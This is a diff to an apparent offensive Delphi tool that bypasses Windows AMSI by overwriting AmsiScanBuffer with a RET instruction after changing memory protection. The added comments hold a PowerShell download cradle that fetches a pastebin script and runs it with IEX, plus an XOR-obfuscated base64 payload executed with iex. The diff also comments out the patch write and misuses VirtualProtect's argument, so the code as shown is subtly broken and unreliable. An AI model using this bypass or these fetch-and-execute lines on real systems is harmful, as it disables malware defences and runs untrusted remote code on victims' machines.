@@ -2,6 +2,10 @@
 https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
 https://stackoverflow.com/questions/2229699/ok-to-use-virtualprotect-to-change-resource-in-delphi
 https://progamercity.net/delphi/789-snippet-write-bytes-memory.html
+
+
+Prots
+http://winapi.freetechsecrets.com/win32/WIN32VirtualProtect.htm
 }
 
 //x86-64 ret 0xC3
@@ -21,6 +25,16 @@ https://progamercity.net/delphi/789-snippet-write-bytes-memory.html
 //    Result := False;
 //end;
 
+
+// (new-object net.webclient).downloadstring('http://pastebin.com/raw.php?i=JHhnFV8m') | IEX
+
+//or
+
+// $base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
+// $bytes = [Convert]::FromBase64String($base64)
+// $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
+// iex $string
+
 program BasedAmsi_E;
 {$APPTYPE CONSOLE}
 
@@ -30,7 +44,7 @@ uses
   Vcl.Forms;
 
 var
-  amsee,kersee : THandle;
+  amsee, kersee : THandle;
   amsibaseaddr, kernbaseaddr : pointer;
   OldProtect, DummyProtect : DWord;
   retpatch : Array[0..0] of byte = ($C3);
@@ -48,17 +62,18 @@ begin
     WriteLn('Failed to load');
     end;
 
+
     //Set region to RWX
-    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, @OldProtect);
+    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, amsibaseaddr);
 
     //Copy Patch
-    WriteIt(amsibaseaddr,(retpatch));
+    //WriteIt(amsibaseaddr,(retpatch));
 
 
     //Move(Bytes, pAddress^, Length(Bytes));
 
     //Restore region to RX
-    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, @OldProtect);
+    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READ, amsibaseaddr);
 
   finally
     FreeLibrary(amsee);
